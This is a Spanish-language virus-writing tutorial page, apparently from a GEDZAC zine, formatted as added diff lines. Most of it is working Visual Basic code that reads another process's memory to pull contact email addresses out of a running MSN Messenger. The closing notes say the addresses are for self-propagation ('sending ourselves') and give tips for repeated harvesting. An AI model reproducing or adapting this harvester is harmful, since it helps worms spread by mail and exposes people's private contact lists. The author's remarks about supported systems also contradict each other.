+Private Declare Function GetClassName Lib "user32" Alias "GetClassNameA" (ByVal hwnd As Long, ByVal lpClassName As String, ByVal nMaxCount As Long) As Long
+Private Declare Function GetWindowThreadProcessId Lib "user32" (ByVal hwnd As Long, lpdwProcessId As Long) As Long
+Private Declare Function PostMessage Lib "user32" Alias "PostMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
+Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
+Private Declare Function FindWindowEx Lib "user32" Alias "FindWindowExA" (ByVal hWnd1 As Long, ByVal hWnd2 As Long, ByVal lpsz1 As String, ByVal lpsz2 As String) As Long
+Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
+
+Private Const WM_COMMAND = &H111
+Private Const SW_RESTORE = 9
+
+Private Const LVM_FIRST = &H1000
+Private Const LVM_GETTITEMCOUNT = (LVM_FIRST + 4)
+Private Const LVM_GETITEMTEXT = (LVM_FIRST + 45)
+
+Private Type LV_ITEM
+  mask As Long
+  iItem As Long
+  iSubItem As Long
+  State As Long
+  stateMask As Long
+  pszText As Long
+  cchTextMax As Long
+  iImage As Long
+  lParam As Long
+  iIndent As Long
+End Type
+
+Private Const LVIF_TEXT As Long = &H1
+
+Private Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
+Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
+Private Declare Function VirtualAllocEx Lib "kernel32" (ByVal hProcess As Long, ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
+Private Declare Function VirtualFreeEx Lib "kernel32" (ByVal hProcess As Long, ByVal lpAddress As Long, ByVal dwSize As Long, ByVal dwFreeType As Long) As Long
+Private Declare Function WriteProcessMemory Lib "kernel32" (ByVal hProcess As Long, ByVal lpBaseAddress As Any, ByRef lpBuffer As Any, ByVal nSize As Long, lpNumberOfBytesWritten As Long) As Long
+Private Declare Function ReadProcessMemory Lib "kernel32" (ByVal hProcess As Long, ByVal lpBaseAddress As Any, ByRef lpBuffer As Any, ByVal nSize As Long, lpNumberOfBytesWritten As Long) As Long
+Private Const PROCESS_VM_OPERATION = &H8
+Private Const PROCESS_VM_READ = &H10
+Private Const PROCESS_VM_WRITE = &H20
+Private Const MEM_COMMIT = &H1000
+Private Const MEM_RELEASE = &H8000
+Private Const PAGE_READWRITE = &H4
+
+Public Function EnumeraVentanas(ByVal hwnd As Long, lParam As Long) As Boolean
+<font color=green>'la funcion que es llamada por enumwindows por cada ventana
+'encontrada, tiene por argumentos el handle de la ventana encontrada y
+el segundo arcumento pasado a enumwindows, que en este caso no usamos</font>
+On Error Resume Next
+Dim ClassName As String * 255
+<font color=green>'obtenemos el nombre de la clase, si es igual a "msnmsblclass"
+'entonces es la ventana del msn y pasamos el handle al sub msn</font>
+Call GetClassName(ByVal hwnd, ByVal ClassName, ByVal Len(ClassName))
+If InStr(LCase(ClassName), "msnmsblclass") <> 0 Then msn (hwnd)
+EnumeraVentanas = True
+End Function
+
+Private Sub msn(mHwnd As Long)
+On Error Resume Next
+Dim sh As Long, x As Long, pid As Long, hp As Long
+<font color=green>'enviamos con postmessage el WM_COMMAND necesario para
+'que msn muestre los contactos por la direccion de correo electronico
+'luego dormimos 1 Seg.</font>
+Call PostMessage(mHwnd, WM_COMMAND, 40308, 0)
+Sleep (1000)
+
+<font color=green>'ahora vamos a tratar de obtener el handle al syslistview
+'para eso debemos conocer los handle de todas sus ventanas "padres",
+'la ventana del msn contiene a una clase PluginHostClass, que dentro
+'tiene a la clase MSNMSBLGeneric, y dentro esta SysListView32, que es la
+'clase del syslistview, para encontrarlo vamos buscando los handles de
+'sus ventanas "padres", hasta encontrarlo.</font>
+sh = FindWindowEx(mHwnd, 0, "PluginHostClass", vbNullString)
+ sh = FindWindowEx(sh, 0, "MSNMSBLGeneric", vbNullString)
+  sh = FindWindowEx(sh, 0, "SysListView32", vbNullString)
+
+<font color=green>'si no encontramos el handle salimos</font>
+if sh = 0 then Exit Sub
+
+<font color=green>'enviamos al syslistview el mensage LVM_GETTITEMCOUNT
+'para que nos responda cuantos items tiene, por ejemplo si nos responde
+'5, deberemos listar los indices desde 0 a 4, no usamos postmessage ahora, 
+'porque postmessage envia el mensage y regresa inmediatamente sin esperar 
+'respuesta de la ventana, como queremos la respuesta del syslistview, 
+'usamos sendmessage, que espera la respuesta.</font>
+x = SendMessage(sh, LVM_GETTITEMCOUNT, 0, 0)
+
+<font color=green>''ahora obtenemos el identificador de proceso (pid) del msn
+'para eso usamos la funcion GetWindowThreadProcessId, a la cual le pasamos
+'el handle del syslistview y nos devuelve en pid el identificador del 
+'proceso al que corresponde el handle de ventana pasado, en este caso el
+'pid del msn.</font>
+Call GetWindowThreadProcessId(sh, pid)
+
+Dim bfa As Long, bfb As Long, contact As String
+<font color=green>'abrimos el proceso con OpenProcess, usamos las opciones
+'PROCESS_VM_OPERATION para que funke VirtualAllocEx y VirtualFreeEx
+'PROCESS_VM_WRITE para WriteProcessMemory y PROCESS_VM_READ para ReadProcessMemory</font>
+hp = OpenProcess(PROCESS_VM_OPERATION Or PROCESS_VM_WRITE Or PROCESS_VM_READ, False, pid)
+
+<font color=green>'si error al abrir el proceso salimos</font>
+if hp = 0 then Exit Sub
+
+<font color=green>'reservamos espacio en la memoria del proceso del msn
+'pasamos a VirtualAllocEx el handle del proceso, la direccion desde donde
+'se empezara a reservar la memoria, si ponemos 0 eso lo determina la fun-
+'cion, luego el numero de bytes a reservar, luego MEM_COMMIT almacena la
+'region reservada en la memoria fisica o en el disco (lo de utilizar
+'el disco como memoria ram virtual), inicializa el espacio a ceros,
+'por ultimo PAGE_READWRITE para darle permiso de lectura/escritura</font>
+bfa = VirtualAllocEx(hp, 0, 255, MEM_COMMIT, PAGE_READWRITE)
+
+If bfa <> 0 Then
+<font color=green>'si hubo exito al reservar la memoria<!-- /font -->
+'declaramos una estructura LV_ITEM</font>
+ Dim lv As LV_ITEM, Buffer As String
+<font color=green>'los miembros de la estructura estan bien explicados
+'en el tutorial de Iczelion sobre syslistview, que se encontraba en
+'www.hackemate.com.ar ,lamentablemente ya no carga el tutorial, capaz
+'buscando en google lo encontrar</font>
+
+<font color=green>'en .mask colocamos LVIF_TEXT para indicar que las partes
+'validas de la estructura seran las referidas al texto del item</font>
+ lv.mask = LVIF_TEXT
+<font color=green>'.iSubItem = 0 porque un syslistview es como una matriz
+'' 0  1 . . n 'con eso indicamos que de cada item, que representaria la fi-
+'1            'la, solo vamos a acceder al texto de la primera columna
+'.            '(0), porque el msn solo usa una matriz de 1x1, si vemos el
+'.            'syslistview que usa el regedit vemos, que usa una matriz
+'n            '1x2 una columna para mostrar el nombre del valor y otra 
+              'para el contenido del valor</font>
+ lv.iSubItem = 0
+<font color=green>'en .pszText pasamos la direccion del buffer de memoria
+'que reservamos en el proceso del msn</font>
+ lv.pszText = bfa
+<font color=green>'.cchTextMax el tamaño del buffer que reservamos</font>
+ lv.cchTextMax = 255
+
+<font color=green>'creamos un buffer rellenado de 255 espacios, que usaremos
+'para leer la memoria con ReadProcessMemory</font>
+ Buffer = Space$(255)
+
+<font color=green>'reservamos memoria para la estructura lv_item</font>
+bfb = VirtualAllocEx(hp, 0, Len(lv), MEM_COMMIT, PAGE_READWRITE)
+
+<font color=green>'un for para leer todos los items</font>
+For i = 0 To x - 1
+<font color=green>'escribimos en el 2° buffer que reservamos en la memoria
+'del proceso del msn, nuestra estructura LV_ITEM, usamos 
+'WriteProcessMemory pasando como argumentos, el handle del proceso, 
+'la direccion de la memoria donde vamos a escribir, en este caso la direc-
+'cion del 2° buffer (bfb), luego lo que vamos a escribir, en este caso la
+'estructura lv_item, luego el tamaño de la estructura, al ultimo creo 
+'que va una var long en la que se devolvera el numero de bytes escritos
+'pero como no la usamos pasamos 0</font>
+ Call WriteProcessMemory(hp, bfb, lv, Len(lv), 0)
+<font color=green>'luego enviamos al syslistview el mensage 
+'LVM_GETITEMTEXT para indicar que queremos que nos de el texto del item,
+'en i va el indice del item, como ultimo argumento va la direccion de
+'la memoria donde escribimos la estructura lv_item</font>
+ Call SendMessage(sh, LVM_GETITEMTEXT, i, ByVal bfb)
+
+<font color=green>'leemos el buffer apuntado por el miembro .pszText de la
+'estructura lv_item, luego leemos la estructura lv_item, pasamos a
+'ReadProcessMemory el handle del proceso, la direccion de memoria desde 
+'donde se empezara a leer, en este caso la direccion de los buffers bfa,
+'bfb, un buffer que recibira lo leido, el numero de bytes a leer, y 
+'ultimo va una var long que recibe el numero de bytes leidos, como no 
+'usamos ese argumento pasamos 0</font>
+ Call ReadProcessMemory(hp, bfa, ByVal Buffer, 255, 0)
+ Call ReadProcessMemory(hp, bfb, lv, Len(lv), 0)
+
+<font color=green>'obtenemos los contactos y los mostramos en un msgbox</font>
+ If InStr(Buffer, "@") Then
+  If (InStr(Buffer, "(") < InStr(Buffer, Chr(0))) And (InStr(Buffer, "(") <> 0) Then
+   contact = Mid(Buffer, 1, InStr(Buffer, " ") - 1)
+  Else
+   contact = Mid(Buffer, 1, InStr(Buffer, Chr(0)) - 1)
+  End If
+  MsgBox contact
+ End If
+Next
+End If
+
+<font color=green>'liberamos la memoria reservada
+'a VirtualFreeEx generalmente se le pasa el handle del proceso, 
+'la direccion de la memoria a liberar, y en tercer parametro el numero
+'de bytes a liberar, pero ahora la usamos para liberar un buffer creado
+'con VirtualAllocEx, por lo que pasamos el handle del proceso, la 
+'direccion del buffer, 0 y MEM_RELEASE que indica liberar todo el buffer</font>
+Call VirtualFreeEx(hp, bfb, 0, MEM_RELEASE)
+Call VirtualFreeEx(hp, bfa, 0, MEM_RELEASE)
+Call CloseHandle(hp)
+End Sub
+</font>
+
+Comentario del Metodo:
+-----------------------
+Solo funciona en WinXp, 2000, NT, he visto que usan CreateFileMapping
+y MapViewOfFile para trabajar con la memoria, para que funke con el win9x,
+tendre que investigar, porque ahora no tengo idea de como hacer eso.
+
+Desventaja principal, no permite obtener el correo del usuario local
+
+Hay que hacer un timer para buscar la ventana del msn cada cierto tiempo
+en vb se puede usar el control timer, en otros lenguajes api SetTimer
+
+Solo funciona si la ventana del msn esta abierta y ademas los items del 
+listview deben estar desplegados.
+
+Se podria guardar una lista de los correos a los que ya nos hemos enviado
+porque muy posiblemente capturaremos los mismos contactos más de una vez
+y eso evitaria que nos reenviaramos al mismo sitio, ahora que si reen-
+viarse en más de una ocasion no les es problema, pos asi nomas
+
+Lo he probado en mi winxp y 98 y funka, aunque no aseguro más del 50%
+de eficacia.
+
+------------------------------------------------------------------------
+Pos creo que ya me extendi mucho, disculpar las imprecisiones en la
+explicacion y ojala servir el texto.
+
+(C) Mitosis 3 - GEDZAC LABS
+</pre></body></html>
